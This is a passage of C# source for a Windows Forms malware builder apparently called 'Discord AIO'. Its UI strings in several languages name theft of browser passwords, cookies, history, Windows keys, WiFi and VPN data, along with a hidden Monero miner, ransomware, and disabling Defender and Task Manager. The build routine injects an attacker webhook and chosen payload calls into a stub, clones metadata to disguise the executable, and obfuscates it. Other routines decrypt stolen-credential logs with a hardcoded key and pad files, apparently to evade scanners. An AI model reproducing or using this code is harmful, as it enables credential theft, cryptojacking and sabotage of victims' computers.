            polishButton.FlatAppearance.BorderSize = 0;
            spanishButton.FlatAppearance.BorderSize = 0;
            turkishButton.FlatAppearance.BorderSize = 0;

            translateLabel.Text = "null";
            translateLabel.ForeColor = Color.FromArgb(5, 5, 5);

            sthww = "Something went wrong.";
            red = "Red";
            green = "Green";
            blue = "Blue";
            white = "White";
            lversion = "Version:";
            uicolor = "UI Color:";
            susername = "Show username:";
            cupdates = "Check-updates:";
            language = "Language:";
            settings = "Settings";
            lmain = "Main";
            additional = "Additional";
            inspector = "Inspector";
            misc = "Misc";
            yes = "Yes";
            no = "No";
            check = "Check";
            upload = "Upload";
            licon = "Icon";
            build = "Build";
            clone = "Clone";
            generate = "Generate";
            fInfo = "Metadata:";
            none = "None";
            whcbe = "Webhook cannot be empty!";
            whvalid = "Webhook valid.";
            whinvalid = "Invalid webhook.";
            generateorclone = "You need to generate or clone metadata.";
            pumpinfo = "You need to provide size of the output file!";
            selectpumpsize = "You need to select the size of pump.";
            pumpedTo = "File pumped to ";
            whdeleted = "Webhook deleted.";
            whfstop = "Webhook flooder stopped.";
            whusmsempty = "Webhook, name and message cannot be empty!";
            toomany = "Too many requests.\nSpam delayed.";
            start = "Start";
            stop = "Stop";
            started = "Started";
            stopped = "Stopped";
            cpuusage = "Select CPU usage.";
            poolusrname = "Provide pool, username and password.";
            compdone = "Compilation done.";
            addcreated = "Additional options created. Compiling...";
            savedas = "Saved as ";
            creatingadds = "Creating additional options...";
            creatingfile = "Creating file...";
            openingexp = "Opening explorer...";
            tokencannotempt = "Token cannot be empty!";
            invalidtoken = "Invalid token.";
            tokendeleted = "Token deleted.";
            disabled = "Disabled";
            enabled = "Enabled";
            unverified = "Unverified";
            verified = "Verified";
            nopass = "No passwords!";
            nocookies = "No cookies!";
            nohistory = "No history!";
            novpn = "No VPN!";
            nowifinetwork = "No WiFi Network data!";
            nowifipass = "No WiFi passwords";
            lminer = "Miner";
            filecreated = "File created. Please wait...";
            exportas = "Export (as .txt)";
            credentials = "Credentials";
            dName = "Name:";
            dIP = "IP Address:";
            dMAC = "MAC Address:";
            dToken = "DC Token:";
            dWin = "WIN Key:";
            embedcolor = "Embed color";
            select = "Select";
            idle = "Idle...";
            delete = "Delete";
            pump = "Pump";
            filepumper = "File pumper";
            lusername = "Username";
            lmessage = "Message";
            floodercolor = "Flooder embed color";
            whflooder = "Webhook flooder";
            deletewh = "Delete webhook";
            deletetkn = "Delete token";
            safemode = "Safe mode";
            addsettings = "Additional settings";
            fakeerror = "Fake error";
            ltitle = "Title";
            customplugin = "Custom plugin";
            lobfuscate = "Obfuscate";
            rostart = "Run on startup";
            disabledefender = "Disable Windows Defender";
            disablemanager = "Disable Task Manager";
            lbsod = "Blue Screen";
            wbblocker = "Website blocker";
            lhide = "Hide stealer";
            ljumpscare = "Jumpscare";
            disableinput = "Disable mouse and keyboard";
            swindowskey = "Steal windows key";
            spasswords = "Steal browser passwords";
            scookies = "Steal browser cookies";
            svpnc = "Steal VPN";
            wifidata = "Steal WiFi data";
            disableinternet = "Disable internet";
            shistory = "Steal browser history";
            cminer = "Crypto miner";
            lransomware = "Ransomware";
            mpool = "Monero pool";
            lpassword = "Password";
            lusage = "CPU usage";
            minerInstruction = "1. Setup your pool (ex. pool.minergate.com:443)\n2. Setup your username. If you're using minergate fill in your email address.\n3. To setup workers' name change password variable.";


            refreshLanguage();
        }

        private void russianButton_Click(object sender, EventArgs e)
        {
            englishButton.FlatAppearance.BorderSize = 0;
            russianButton.FlatAppearance.BorderSize = 1;
            frenchButton.FlatAppearance.BorderSize = 0;
            polishButton.FlatAppearance.BorderSize = 0;
            spanishButton.FlatAppearance.BorderSize = 0;
            turkishButton.FlatAppearance.BorderSize = 0;

            translateLabel.Text = "null";
            translateLabel.ForeColor = Color.FromArgb(5, 5, 5);

            sthww = "Что-то пошло не так.";
            red = "красный";
            green = "Зеленый";
            blue = "Синий";
            white = "белый";
            lversion = "Версия:";
            uicolor = "UI Цвет:";
            susername = "Показать имя пользователя:";
            cupdates = "Актуализация:";
            language = "Язык:";
            settings = "Настройки";
            lmain = "Строна головная";
            additional = "Дополнительный";
            inspector = "Инспектор";
            misc = "Разное";
            yes = "да";
            no = "Нет";
            check = "Проверить";
            upload = "Загрузить";
            licon = "Значок";
            build = "Строить";
            clone = "Клон";
            generate = "Создать";
            fInfo = "Метаданные:";
            none = "Никто";
            whcbe = "Webhook не может быть пустым!";
            whvalid = "Webhook действительный.";
            whinvalid = "Неверный webhook.";
            generateorclone = "Вам нужно сгенерировать или клонировать информацию о файле.";
            pumpinfo = "Вам необходимо указать размер выходного файла!";
            selectpumpsize = "Вам нужно выбрать размер насоса.";
            pumpedTo = "Файл перекачан в ";
            whdeleted = "Webhook удален.";
            whfstop = "Webhook flooder остановился.";
            whusmsempty = "Webhook, имя и сообщение не могут быть пустыми!";
            toomany = "Слишком много запросов.\nСпам задержан.";
            start = "Start";
            stop = "Stop";
            started = "Начал";
            stopped = "Остановлено";
            cpuusage = "Выберите загрузку процессора.";
            poolusrname = "Укажите пул, имя пользователя и пароль.";
            compdone = "Сборка сделана.";
            addcreated = "Созданы дополнительные опции. Компиляция...";
            savedas = "Сохранено как ";
            creatingadds = "Создание дополнительных опций...";
            creatingfile = "Создание файла...";
            openingexp = "Открытие проводника...";
            tokencannotempt = "Token не может быть пустым!";
            invalidtoken = "Неверный token.";
            tokendeleted = "Token удален.";
            disabled = "Disabled";
            enabled = "Enabled";
            unverified = "Непроверенный";
            verified = "проверено";
            nopass = "Нет паролей!";
            nocookies = "Нет печенье!";
            nohistory = "Нет история!";
            novpn = "Нет VPN!";
            nowifinetwork = "Нет WiFi Network data!";
            nowifipass = "Нет WiFi passwords";
            lminer = "Шахтер";
            filecreated = "Файл создан. Пожалуйста, подождите...";
            exportas = "Экспорт (как .txt)";
            credentials = "Данные";
            dName = "Имя:";
            dIP = "Айпи адрес:";
            dMAC = "MAC-адрес:";
            dToken = "DC Token:";
            dWin = "WIN Ключ:";
            embedcolor = "Вставить цвет";
            select = "Выбирать";
            idle = "Праздный...";
            delete = "Удалить";
            pump = "Насос";
            filepumper = "насос";
            lusername = "Имя пользователя";
            lmessage = "Сообщение";
            floodercolor = "Вставить цвет";
            whflooder = "Webhook flooder";
            deletewh = "Удалить webhook";
            deletetkn = "Удалить token";
            safemode = "Безопасный режим";
            addsettings = "Дополнительные настройки";
            fakeerror = "Поддельная ошибка";
            ltitle = "Заголовок";
            customplugin = "Пользовательский плагин";
            lobfuscate = "запутать";
            rostart = "Run on startup";
            disabledefender = "Запрещать Windows Defender";
            disablemanager = "Запрещать Task Manager";
            lbsod = "Blue Screen";
            wbblocker = "Website блокиратор";
            lhide = "Скрыть похититель";
            ljumpscare = "Jumpscare";
            disableinput = "Отключить мышь и клавиатуру";
            swindowskey = "Украсть windows ключ";
            spasswords = "Украсть пароли браузера";
            scookies = "Украсть куки браузера";
            svpnc = "Украсть VPN";
            wifidata = "Украсть WiFi data";
            disableinternet = "Отключить интернет";
            shistory = "Украсть историю браузера";
            cminer = "Крипто майнер";
            lransomware = "Ransomware";
            mpool = "Кошелек Монеро";
            lpassword = "Пароль";
            lusage = "использование процессора";
            minerInstruction = "1. Настройте свой пул (например, pool.minergate.com:443)\n2. Настройте свое имя пользователя. Если вы используете Minergate, введите свой адрес электронной почты.\n3. Чтобы настроить переменную пароля смены имени воркера.";

            refreshLanguage();
        }

        private void frenchButton_Click(object sender, EventArgs e)
        {
            englishButton.FlatAppearance.BorderSize = 0;
            russianButton.FlatAppearance.BorderSize = 0;
            frenchButton.FlatAppearance.BorderSize = 1;
            polishButton.FlatAppearance.BorderSize = 0;
            spanishButton.FlatAppearance.BorderSize = 0;
            turkishButton.FlatAppearance.BorderSize = 0;
        }

        private void polishButton_Click(object sender, EventArgs e)
        {
            englishButton.FlatAppearance.BorderSize = 0;
            russianButton.FlatAppearance.BorderSize = 0;
            frenchButton.FlatAppearance.BorderSize = 0;
            polishButton.FlatAppearance.BorderSize = 1;
            spanishButton.FlatAppearance.BorderSize = 0;
            turkishButton.FlatAppearance.BorderSize = 0;

            translateLabel.Text = "null";
            translateLabel.ForeColor = Color.FromArgb(5, 5, 5);

            sthww = "Coś poszło nie tak.";
            red = "Czerwony";
            green = "Zielony";
            blue = "Niebieski";
            white = "Biały";
            lversion = "Wersja:";
            uicolor = "Kolor UI:";
            susername = "Pokaż nazwę:";
            cupdates = "Aktualizacja:";
            language = "Język:";
            settings = "Ustawienia";
            lmain = "Strona główna";
            additional = "Dodatki";
            inspector = "Inspektor";
            misc = "Inne";
            yes = "Tak";
            no = "Nie";
            check = "Sprawdź";
            upload = "Wgraj";
            licon = "Ikona";
            build = "Stwórz";
            clone = "Sklonuj";
            generate = "Generuj";
            fInfo = "Metadane:";
            none = "Brak";
            whcbe = "Webhook nie może być pusty!";
            whvalid = "Webhook działa.";
            whinvalid = "Webhook nie działa.";
            generateorclone = "Musisz wygenerować lub sklonować metadane.";
            pumpinfo = "Musisz wprowadzić wielkość pliku końcowego!";
            selectpumpsize = "Musisz wybrać wielkość pompowania.";
            pumpedTo = "Plik napompowany do ";
            whdeleted = "Webhook usunięty.";
            whfstop = "Webhook flooder zatrzymany.";
            whusmsempty = "Webhook, nazwa oraz wiadomość nie mogą być puste!";
            toomany = "Zbyt dużo zapytań.\nSpam przesunięty.";
            start = "Start";
            stop = "Stop";
            started = "Działa";
            stopped = "Zatrzymany";
            cpuusage = "Wybierz zużycie CPU.";
            poolusrname = "Wprowadź portfel, nazwę oraz hasło.";
            compdone = "Kompilacja zakończona.";
            addcreated = "Dodatkowe opcje utworzone. Kompilowanie...";
            savedas = "Zapisano jako ";
            creatingadds = "Tworzenie dodatkowych opcji...";
            creatingfile = "Tworzenie pliku...";
            openingexp = "Otwieranie eksploratora...";
            tokencannotempt = "Token nie może być pusty!";
            invalidtoken = "Zły token.";
            tokendeleted = "Token usunięty.";
            disabled = "Wyłączone";
            enabled = "Włączone";
            unverified = "Niezweryfikowany";
            verified = "Zweryfikowany";
            nopass = "Brak haseł!";
            nocookies = "Brak ciasteczek!";
            nohistory = "Brak historii!";
            novpn = "Brak VPN!";
            nowifinetwork = "Brak WiFi Network data!";
            nowifipass = "Brak WiFi passwords";
            lminer = "Koparka";
            filecreated = "Plik utworzony. Proszę czekać...";
            exportas = "Wyeksportuj (jako .txt)";
            credentials = "Dane przeglądarki";
            dName = "Nazwa:";
            dIP = "Adres IP:";
            dMAC = "Adres MAC:";
            dToken = "DC Token:";
            dWin = "Klucz WIN:";
            embedcolor = "Osadzony kolor";
            select = "Wybierz";
            idle = "Bezczynny...";
            delete = "Usuń";
            pump = "Pompuj";
            filepumper = "Pompowanie";
            lusername = "Nazwa";
            lmessage = "Wiadomość";
            floodercolor = "Osadzony kolor";
            whflooder = "Webhook flooder";
            deletewh = "Usuń webhook";
            deletetkn = "Usuń token";
            safemode = "Tryb bezpieczny";
            addsettings = "Ustawienia dodatkowe";
            fakeerror = "Fałszywy błąd";
            ltitle = "Tytuł";
            customplugin = "Niestandardowy plugin";
            lobfuscate = "Szyfruj";
            rostart = "Uruchamiaj zawsze";
            disabledefender = "Wyłącz Windows Defender";
            disablemanager = "Wyłącz Menedżer Zadań";
            lbsod = "Blue Screen";
            wbblocker = "Blokowanie stron";
            lhide = "Ukryj program";
            ljumpscare = "Jumpscare";
            disableinput = "Wyłącz mysz i klawiature";
            swindowskey = "Ukradnij klucz windows";
            spasswords = "Ukradnij hasła przeglądarki";
            scookies = "Ukradnij ciasteczka przeglądarki";
            svpnc = "Ukradnij VPN";
            wifidata = "Ukradnij dane WiFi";
            disableinternet = "Wyłącz internet";
            shistory = "Ukradnij historie przeglądarki";
            cminer = "Koparka kryptowalut";
            lransomware = "Ransomware";
            mpool = "Portfel monero";
            lpassword = "Hasło";
            lusage = "Zużycie CPU";
            minerInstruction = "1. Ustaw swój portfel (np. pool.minergate.com:443)\n2. Ustaw nazwę. Jeśli używasz minergate wprowadź swój email.\n3. Aby ustawić imiona pracowników' zmień hasło.";

            refreshLanguage();
        }

        private void spanishButton_Click(object sender, EventArgs e)
        {
            englishButton.FlatAppearance.BorderSize = 0;
            russianButton.FlatAppearance.BorderSize = 0;
            frenchButton.FlatAppearance.BorderSize = 0;
            polishButton.FlatAppearance.BorderSize = 0;
            spanishButton.FlatAppearance.BorderSize = 1;
            turkishButton.FlatAppearance.BorderSize = 0;
        }

        private void turkishButton_Click(object sender, EventArgs e)
        {
            englishButton.FlatAppearance.BorderSize = 0;
            russianButton.FlatAppearance.BorderSize = 0;
            frenchButton.FlatAppearance.BorderSize = 0;
            polishButton.FlatAppearance.BorderSize = 0;
            spanishButton.FlatAppearance.BorderSize = 0;
            turkishButton.FlatAppearance.BorderSize = 1;

            translateLabel.Text = "Tercüme: Rescore#3692";
            translateLabel.ForeColor = Color.DarkRed;

            sthww = "Bir şeyler yanlış gitti.";
            red = "kırmızı";
            green = "Yeşil";
            blue = "mavi";
            white = "Beyaz";
            lversion = "sürüm:";
            uicolor = "kullanıcı arayüzü rengir:";
            susername = "Kullanıcı adını göster:";
            cupdates = "kupalar:";
            language = "dilim:";
            settings = "Ayarlar";
            lmain = "ana";
            additional = "ek olarak";
            inspector = "müfettiş";
            misc = "çeşitli";
            yes = "Evet";
            no = "HAYIR";
            check = "Kontrol";
            upload = "yüklemek";
            licon = "simge";
            build = "Yapı";
            clone = "klon";
            generate = "üretmek";
            fInfo = "meta veri:";
            none = "Yok";
            whcbe = "Web kancası boş olamaz!";
            whvalid = "Web kancası boş olamaz.";
            whinvalid = "Geçersiz Web kancası.";
            generateorclone = "Dosya bilgilerini oluşturmanız veya klonlamanız gerekiyor.";
            pumpinfo = "Çıktı dosyasının boyutunu sağlamanız gerekir!";
            selectpumpsize = "Pompa boyutunu seçmeniz gerekiyor.";
            pumpedTo = "Dosya pompalandı ";
            whdeleted = "Web kancası Silindi.";
            whfstop = "Web kancası taşması durduruldu.";
            whusmsempty = "Web kancası, ad ve mesaj boş bırakılamaz!";
            toomany = "Çok fazla istek.";
            start = "Başlama";
            stop = "Dur";
            started = "başladı";
            stopped = "durdu";
            cpuusage = "CPU kullanımını seçin.";
            poolusrname = "Başarıyla Derlendi.";
            compdone = "derleme yapıldı.";
            addcreated = "Ek seçenekler oluşturuldu. Derleniyor...";
            savedas = "Farklı Kaydedildi";
            creatingadds = "Ek seçenekler oluşturuluyor...";
            creatingfile = "Dosya oluşturuluyor...";
            openingexp = "Gezgin açılıyor...";
            tokencannotempt = "Jeton boş olamaz!";
            invalidtoken = "Geçersiz jeton.";
            tokendeleted = "jeton silindi.";
            disabled = "Engelli";
            enabled = "Etkinleştirilmiş";
            unverified = "Doğrulanmamış";
            verified = "doğrulandı";
            nopass = "doğrulandı";
            nocookies = "Kurabiye yok!";
            nohistory = "Tarih yok!";
            novpn = "VPN yok!";
            nowifinetwork = "WiFi Ağ verisi yok!";
            nowifipass = "WiFi şifresi yok";
            lminer = "Madenci";
            filecreated = "Dosya oluşturuldu. Lütfen bekle...";
            exportas = "Dışa aktar (.txt olarak))";
            credentials = "kimlik bilgileri";
            dName = "İsim:";
            dIP = "IP adresi:";
            dMAC = "Mac Adresi:";
            dToken = "DC Simgesi:";
            dWin = "KAZANMA Anahtarı:";
            embedcolor = "Gömme rengi";
            select = "Seçme";
            idle = "Boşta...";
            delete = "Silmek";
            pump = "Pompa";
            filepumper = "Dosya pompalayıcı";
            lusername = "Kullanıcı adı";
            lmessage = "İleti";
            floodercolor = "Flooder yerleştirme rengi";
            whflooder = "Web kancası seli";
            deletewh = "Web kancasını sil";
            deletetkn = "Simgeyi sil";
            safemode = "Güvenli mod";
            addsettings = "Ek ayarlar";
            fakeerror = "Sahte hata";
            ltitle = "Başlık";
            customplugin = "Özel eklenti";
            lobfuscate = "şaşırtmak";
            rostart = "Başlangıçta çalıştır";
            disabledefender = "Windows Defender'ı devre dışı bırakın";
            disablemanager = "Görev Yöneticisini Devre Dışı Bırak";
            lbsod = "BSOD";
            wbblocker = "Web sitesi engelleyici";
            lhide = "hırsızı gizle";
            ljumpscare = "Jumpscare";
            disableinput = "Fare ve klavyeyi devre dışı bırak";
            swindowskey = "Windows anahtarını çal";
            spasswords = "Tarayıcı şifrelerini çal";
            scookies = "Tarayıcı çerezlerini çal";
            svpnc = "VPN çal";
            wifidata = "WiFi verilerini çal";
            disableinternet = "İnterneti devre dışı bırak";
            shistory = "Tarayıcı geçmişini çal";
            cminer = "kripto madenci";
            lransomware = "Fidye yazılımı";
            mpool = "para havuzu";
            lpassword = "Şifre";
            lusage = "CPU kullanımı";
            minerInstruction = "1. Havuzunuzu kurun (ör. pool.minergate.com:443)\n2. Kullanıcı adınızı ayarlayın. Minergate kullanıyorsanız e-posta adresinizi girin.\n3. İşçilerin adını ayarlamak için parola değişkenini değiştirin.";

            refreshLanguage();
        }

        private void cloneButton_Click(object sender, EventArgs e)
        {
            try
            {
                string mTitle = "null";
                string mDescription = "null";
                string mProduct = "null";
                string mCompany = "null";
                string mCopyright = "null";
                string mTrademark = "null";
                string mMajorVersion = "null";
                string mMinorVersion = "null";
                string mBuildPart = "null";
                string mPrivatePart = "null";

                OpenFileDialog cloningDialog = new OpenFileDialog();
                cloningDialog.Filter = "Executable (*.exe)|*.exe";

                if (cloningDialog.ShowDialog() == DialogResult.OK)
                {
                    string path = Path.GetFullPath(cloningDialog.FileName);

                    FileVersionInfo info = FileVersionInfo.GetVersionInfo(path);
                    mTitle = info.OriginalFilename;
                    mDescription = info.FileDescription;
                    mProduct = info.ProductName;
                    mCompany = info.CompanyName;
                    mCopyright = info.LegalCopyright;
                    mTrademark = info.LegalTrademarks;
                    mMajorVersion = info.FileMajorPart.ToString();
                    mMinorVersion = info.FileMinorPart.ToString();
                    mBuildPart = info.FileBuildPart.ToString();
                    mPrivatePart = info.FileBuildPart.ToString();

                }
                if (mDescription == "")
                {
                    fileinfoLabel.Text = mProduct;
                }
                else
                {
                    fileinfoLabel.Text = mDescription;
                }

                Title = mTitle;
                Description = mDescription;
                Product = mProduct;
                Company = mCompany;
                Copyright = mCopyright;
                Trademark = mTrademark;
                MajorVersion = mMajorVersion;
                MinorVersion = mMinorVersion;
                BuildPart = mBuildPart;
                PrivatePart = mPrivatePart;
            }
            catch
            {
                PopupMessage(sthww);
            }
        }

        private void generateButton_Click(object sender, EventArgs e)
        {
            FileInfo randomFileInfo = randomFileInfo_0.getRandomFileInfo();
            Title = randomFileInfo.Title;
            Description = randomFileInfo.Description;
            Product = randomFileInfo.Product;
            Company = randomFileInfo.Company;
            Copyright = randomFileInfo.Copyright;
            Trademark = randomFileInfo.Trademark;
            MajorVersion = randomFileInfo.MajorVersion;
            MinorVersion = randomFileInfo.MinorVersion;
            BuildPart = randomFileInfo.BuildPart;
            PrivatePart = randomFileInfo.PrivatePart;

            fileinfoLabel.Text = Description;
        }

        private void colorSelect_Click(object sender, EventArgs e)
        {
            ColorDialog dlg = new ColorDialog();
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                embedBox.BackColor = Color.FromArgb(dlg.Color.A, dlg.Color.R, dlg.Color.G, dlg.Color.B);
            }
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            if (fileinfoLabel.Text == none)
            {
                PopupMessage(generateorclone);
            }
            else
            {
                buildingLabel.Text = openingexp;
                try
                {
                    using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                    {
                        saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                        if (saveFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            buildingLabel.Text = creatingfile;
                            string text = Properties.Resources.stub;
                            text = text.Replace("DiscordAIO", _randomChars.getRandomCharacters(_random.Next(10, 20)));
                            text = text.Replace("%Title%", Title);
                            text = text.Replace("%Description%", Description);
                            text = text.Replace("%Product%", Product);
                            text = text.Replace("%Company%", Company);
                            text = text.Replace("%Copyright%", Copyright);
                            text = text.Replace("%Trademark%", Trademark);
                            text = text.Replace("%v1%", MajorVersion);
                            text = text.Replace("%v2%", MinorVersion);
                            text = text.Replace("%v3%", BuildPart);
                            text = text.Replace("%v4%", PrivatePart);
                            text = text.Replace("%Guid%", Guid.NewGuid().ToString());
                            text = text.Replace("AIOwebhook", webhookBox.Text);
                            buildingLabel.Text = filecreated;
                            string embedColor = embedBox.BackColor.ToArgb().ToString();
                            embedColor = embedColor.Remove(0, 1);
                            Thread.Sleep(1000);
                            buildingLabel.Text = creatingadds;
                            // Embed color
                            text = text.Replace("%selectedColor%", embedColor);

                            // Add to Startup
                            if (startupBox.Checked)
                            {
                                text = text.Replace("//startupaio", "Startup();");
                            }
                            // Hide stealer
                            if (hidesBox.Checked)
                            {
                                text.Replace("//hideme", "HideFile();");
                            }
                            // Fake error
                            if (errorBox.Checked)
                            {
                                text = text.Replace("//errorhere", "Error();");
                                text = text.Replace("titleError", faketitleBox.Text);
                                text = text.Replace("messageError", fakeMessageBox.Text);
                            }
                            // BSOD
                            if (bsodBox.Checked)
                            {
                                text = text.Replace("//bsodlmao", "BSOD();");
                            }
                            // Task Manager
                            if (taskmanagerBox.Checked)
                            {
                                text = text.Replace("//killctrlaltdel", "KillTM();");
                            }
                            // Windows Defender
                            if (defenderBox.Checked)
                            {
                                text = text.Replace("//killdefender", "Defender.KillDefender();");
                            }
                            // Input
                            if (inputdBox.Checked)
                            {
                                text = text.Replace("//killinput", "BlockInput();");
                            }
                            // Websites
                            if (blockerBox.Checked)
                            {
                                text = text.Replace("//killweb", "KillWebsites();");
                            }
                            // Internet
                            if (dinternetBox.Checked)
                            {
                                text = text.Replace("//killinternet", "KillWIFI();");
                            }
                            // Desktop picture
                            //   if (checkBox21.Checked)
                            //    {
                            //        text = text.Replace("//takepic", "TakePicture();");
                            //    }
                            // Jumpscare
                            if (jumpscareBox.Checked)
                            {
                                text = text.Replace("//jumpscare", "Jumpscare();");
                            }
                            // Custom plugin
                            if (pluginBox.Checked)
                            {
                                text = text.Replace("//custom", "CustomPlugin();");
                                text = text.Replace("//%customcodehere%", pluginSource.Text);
                            }
                            // Windows product key
                            if (swinkeyBox.Checked)
                            {
                                text = text.Replace("//winkey", "WinProductKey();");
                            }

                            // Passwords
                            if (sbrpassBox.Checked)
                            {
                                text = text.Replace("//stealpasses", "Chrome.RunPass();");
                            }
                            // Cookies
                            if (sbrCookiesBox.Checked)
                            {
                                text = text.Replace("//stealcookies", "Chrome.RunCookies();");
                            }
                            // History
                            if (sbrhisBox.Checked)
                            {
                                text = text.Replace("//stealhistory", "Chrome.RunHis();");
                            }
                            // CC
                            //    if (checkBox12.Checked)
                            //    {
                            //        text = text.Replace("//stealcreditcard", "Chrome.RunCC();");
                            //    }

                            // WIFI passwords
                            if (swifiBox.Checked)
                            {
                                text = text.Replace("//stealwifi", "StealWIFI();");
                            }
                            // NordVPN
                            if (sVpnBox.Checked)
                            {
                                text = text.Replace("//stealnord", "NordVPN.Save();");
                            }

                            // Crypto
                            if (cryptoBox.Checked)
                            {
                                if (String.IsNullOrEmpty(textBox6.Text) || String.IsNullOrWhiteSpace(textBox6.Text) || String.IsNullOrEmpty(textBox3.Text) || String.IsNullOrWhiteSpace(textBox3.Text) || String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text))
                                {
                                    if (checkBox2.Checked || checkBox3.Checked || checkBox4.Checked)
                                    {
                                        if (checkBox4.Checked)
                                        {
                                            text = text.Replace("%usagehere%", "RunMonero();");
                                        }
                                        else if (checkBox3.Checked)
                                        {
                                            text = text.Replace("%usagehere%", "RunMonero();");
                                        }
                                        else if (checkBox2.Checked)
                                        {
                                            text = text.Replace("%usagehere%", "RunMonero();");
                                        }

                                        text = text.Replace("%poolhere%", textBox6.Text);
                                        text = text.Replace("%usernamehere%", textBox3.Text);
                                        text = text.Replace("%passwordhere%", textBox1.Text);

                                        text = text.Replace("//sneakyminer", "RunMonero();");
                                    }
                                    else
                                    {
                                        PopupMessage(cpuusage);
                                    }
                                }
                                else
                                {
                                    PopupMessage(poolusrname);
                                }
                            }

                            // Ransom
                            if (ransomBox.Checked)
                            {
                                //    text = text.Replace("//r4nsomw4reee", "");
                            }

                            bool obfuscationCheck = false;
                            // Obfuscation
                            if (obfuscateBox.Checked)
                            {
                                obfuscationCheck = true;
                            }

                            buildingLabel.Text = addcreated;
                            Thread.Sleep(500);
                            if (Compiler.Compilation(text, saveFileDialog.FileName, obfuscationCheck, string.IsNullOrWhiteSpace(label38.Text) ? null : label38.Text))
                            {
                                buildingLabel.Text = savedas + saveFileDialog.FileName;
                                PopupMessage(compdone);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {

                }
            }
        }

        private const int Keysize = 256;
        private const int DerivationIterations = 1000;

        // Do not touch
        private protected static string dAIOPass = "zTj8SWKbamgzfHYWamRd2A24ZrtdWe";

        public static string Decrypt(string cipherText)
        {
            var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
            var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
            var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
            var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();
            using (var password = new Rfc2898DeriveBytes(dAIOPass, saltStringBytes, DerivationIterations))
            {
                var keyBytes = password.GetBytes(Keysize / 8);
                using (var symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.BlockSize = 256;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
                    {
                        using (var memoryStream = new MemoryStream(cipherTextBytes))
                        {
                            using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                            {
                                var plainTextBytes = new byte[cipherTextBytes.Length];
                                var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
                                memoryStream.Close();
                                cryptoStream.Close();
                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
                            }
                        }
                    }
                }
            }
        }

        private void dAIOupload_Click(object sender, EventArgs e)
        {
            string ipData = "N/A";
            string nameData = "N/A";
            string tokenData = "N/A";
            string macData = "N/A";
            string link = "N/A";
            string winkeyData = "N/A";

            try
            {
                using (OpenFileDialog open = new OpenFileDialog())
                {
                    open.Filter = "dAIO (*.dAIO)|*.dAIO";
                    if (open.ShowDialog() == DialogResult.OK)
                    {
                        string creText = File.ReadAllText(open.FileName);
                        string directoryPath = Path.GetDirectoryName(open.FileName);
                        dAIObox.Text = directoryPath;
                        if (creText.Contains("Discord AIO"))
                        {
                            ipData = getBetween(creText, "IP Address: ", " |");
                            nameData = getBetween(creText, "Desktop name: ", " |");
                            macData = getBetween(creText, "MAC Address: ", " |");

                            string[] lines = File.ReadAllLines(open.FileName);
                            for (int i = 0; i < lines.Length; i++)
                            {
                                if (lines[i].Contains("# End of Tokens") && i >= 2)
                                {
                                    tokenData = lines[i - 2];
                                }
                            }

                            if (creText.Contains("# Windows"))
                            {
                                winkeyData = getBetween(creText, "Key: ", " |");
                            }

                            nameBox.Text = nameData;
                            ipBox.Text = ipData;
                            tokenBox.Text = tokenData;
                            macBox.Text = macData;
                            winBox.Text = winkeyData;
                        }
                        else
                        {
                            string decryptedText = Decrypt(creText);

                            creText = creText.Replace(creText, decryptedText);
                            File.WriteAllText(open.FileName, creText);

                            ipData = getBetween(decryptedText, "IP Address: ", " |");
                            nameData = getBetween(decryptedText, "Desktop name: ", " |");
                            macData = getBetween(decryptedText, "MAC Address: ", " |");

                            string[] lines = File.ReadAllLines(open.FileName);
                            for (int i = 0; i < lines.Length; i++)
                            {
                                if (lines[i].Contains("# End of Tokens") && i >= 2)
                                {
                                    tokenData = lines[i - 2];
                                }
                            }

                            if (decryptedText.Contains("# Windows"))
                            {
                                winkeyData = getBetween(decryptedText, "Key: ", " |");
                            }

                            nameBox.Text = nameData;
                            ipBox.Text = ipData;
                            tokenBox.Text = tokenData;
                            macBox.Text = macData;
                            winBox.Text = winkeyData;
                        }
                    }
                }
            }
            catch
            {
            }
        }

        private void pumpButton_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(pumpBox.Text) || String.IsNullOrWhiteSpace(pumpBox.Text))
            {
                PopupMessage(pumpinfo);
            }
            else
            {
                OpenFileDialog pumpingDialog = new OpenFileDialog();
                pumpingDialog.Filter = "Executable (*.exe)|*.exe";
                pumpingDialog.Title = "Select file to pump";

                if (pumpingDialog.ShowDialog() == DialogResult.OK)
                {
                    pumpPathBox.Text = pumpingDialog.FileName;

                    Thread pumping = new Thread(PumpingFile);
                    pumping.Start();
                }
            }
        }

        private void PumpingFile()
        {
            try
            {
                var openedFile = File.OpenWrite(pumpPathBox.Text);
                var originalSize = openedFile.Seek(0, SeekOrigin.End);
                var pumpSize = Convert.ToInt64(pumpBox.Text);

                if (kbBox.Checked)
                {
                    decimal bYTE = pumpSize * 1024; // KB

                    while (originalSize < bYTE)
                    {
                        originalSize++;
                        openedFile.WriteByte(0);
                    }
                    openedFile.Close();
                    PopupMessage(pumpedTo + pumpSize.ToString() + "KB");
                }
                else if (mbBox.Checked)
                {
                    decimal bYTE = pumpSize * 1024 * 1024; // MB

                    while (originalSize < bYTE)
                    {
                        originalSize++;
                        openedFile.WriteByte(0);
                    }
                    openedFile.Close();
                    PopupMessage(pumpedTo + pumpSize.ToString() + "MB");
                }
                else if (gbBox.Checked)
                {
                    decimal bYTE = pumpSize * 1024 * 1024 * 1024; // GB

                    while (originalSize < bYTE)
                    {
                        originalSize++;
